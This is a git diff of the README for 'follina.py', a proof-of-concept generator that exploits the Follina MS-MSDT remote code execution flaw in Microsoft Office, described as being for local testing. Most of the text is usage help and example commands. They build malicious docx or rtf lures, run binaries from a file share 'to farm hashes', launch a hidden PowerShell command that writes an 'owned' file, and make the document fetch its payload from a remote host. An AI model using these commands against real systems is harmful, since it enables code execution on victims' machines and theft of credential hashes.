@@ -1,21 +1,21 @@
 # 'Follina' MS-MSDT n-day Microsoft Office RCE
 
-Quick POC to replicate the 'Follina' Office RCE vulnerability for local testing purposes. Running the script will generate the `clickme.docx` payload file in your current working directory, and start a web server with the payload file (`www/exploit.html`). The payload and web server parameters are configurable (see examples).
+Quick POC to replicate the 'Follina' Office RCE vulnerability for local testing purposes. Running the script will generate a `clickme.docx` (or `clickme.rtf`) payload file in your current working directory, and start a web server with the payload file (`www/exploit.html`). The payload and web server parameters are configurable (see help and examples).
 
 > ⚠ DO NOT USE IN PRODUCTION LEST YOU BE REGARDED A DUMMY
 
 ## Usage:
 
 ```
+$ python .\follina.py -h
+usage: follina.py [-h] -m {command,binary} [-b BINARY] [-c COMMAND] -t {rtf,docx} [-u URL] [-H HOST] [-P PORT]
+
 options:
   -h, --help            show this help message and exit
 
 Required Arguments:
-  -t {docx,rtf}, --type {docx,rtf}
-                        Choose type of payload (RTF, DOCX)
-  -m {binary,command}, --mode {binary,command}
-                        Execution mode, can be "binary" to load a (remote) binary, or "command" to run an encoded PS
-                        command
+  -m {command,binary}, --mode {command,binary}
+                        Execution mode, can be "binary" to load a (remote) binary, or "command" to run an encoded PS command
 
 Binary Execution Arguments:
   -b BINARY, --binary BINARY
@@ -26,8 +26,9 @@ Command Execution Arguments:
                         The encoded command to execute in "command" mode
 
 Optional Arguments:
-  -u URL, --url URL     The hostname or IP address where the generated document should retrieve your payload, defaults
-                        to "localhost"
+  -t {rtf,docx}, --type {rtf,docx}
+                        The type of payload to use, can be "docx" or "rtf"
+  -u URL, --url URL     The hostname or IP address where the generated document should retrieve your payload, defaults to "localhost". Disables web server if custom URL scheme or path are specified
   -H HOST, --host HOST  The interface for the web server to listen on, defaults to all interfaces (0.0.0.0)
   -P PORT, --port PORT  The port to run the HTTP server on, defaults to 80
 ```
@@ -42,10 +43,10 @@ python .\follina.py -t docx -m binary -b \windows\system32\calc.exe
 python .\follina.py -t rtf -m binary -b \\windows\\system32\\calc.exe
 
 # Execute a binary from a file share (can be used to farm hashes 👀)
-python .\follina.py -t rtf -m binary -b \\localhost\c$\windows\system32\calc.exe
+python .\follina.py -t docx -m binary -b \\localhost\c$\windows\system32\calc.exe
 
 # Execute an arbitrary powershell command
-python .\follina.py -t docx -m command -c "Start-Process c:\windows\system32\cmd.exe -WindowStyle hidden -ArgumentList '/c echo owned > c:\users\public\owned.txt'"
+python .\follina.py -t rtf -m command -c "Start-Process c:\windows\system32\cmd.exe -WindowStyle hidden -ArgumentList '/c echo owned > c:\users\public\owned.txt'"
 
 # Run the web server on the default interface (all interfaces, 0.0.0.0), but tell the malicious document to retrieve it at http://1.2.3.4/exploit.html
 python .\follina.py -t docx -m binary -b \windows\system32\calc.exe -u 1.2.3.4
